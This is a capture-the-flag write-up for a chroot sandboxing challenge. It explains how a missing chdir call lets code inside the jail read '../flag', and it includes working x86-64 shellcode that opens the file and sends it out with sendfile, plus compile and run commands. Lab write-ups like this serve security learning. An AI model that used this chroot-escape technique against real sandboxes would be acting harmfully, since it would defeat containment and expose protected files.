# Sandboxing - Level 2
This level was very similar to the previous one, it's a chroot challenge but the programmer forgots to call `chdir` which allow us to access data outside our jail, also this time, the challenge calls `strstr` and makes sure the argument we gave to our program does not contain the word "flag", this is quite a hassle. To compensate this inconvenient the binary reads and executes shellcode.

Since we are not allowed to read the `/flag` file we will use shellcode to do so, i am running the challenge in a directory called `/challenge` and the flag file is stored at `/flag`, this means i can access the `/flag` file from my directory using `../flag` this will be important for our shellcode, since `chroot` changes the meaning of `/` we can't access `/flag` using it's absolute path, instead we gonna have to access it from our directory.

Here's the shellcode i wrote to solve this challenge.
```x86asm
.intel_syntax noprefix
.global _start
_start:
  mov rax, 2
  lea rdi, [rip+flag]
  xor rsi, rsi
  mov rdx, 56
  syscall
  
  mov rsi, rax
  mov rdi, 1
  mov rax, 40
  xor rdx, rdx
  mov r10, 56
  syscall
flag:
  .ascii "../flag"
```

You can compile the shellcode and extract the `.text` section in a file named `shellcode.bytes` using the following 2 commands.
```
$ gcc -w -nostdlib -static shellcode.s -o shellcode
$ objcopy --dump-section .text=shellcode.bytes shellcode
```

Then you can run the program and redirect the shellcode to input using the following command.
```
$ ./babyjail_level2 whatever.file < shellcode.bytes
flag{fake_flag_for_testing}
```
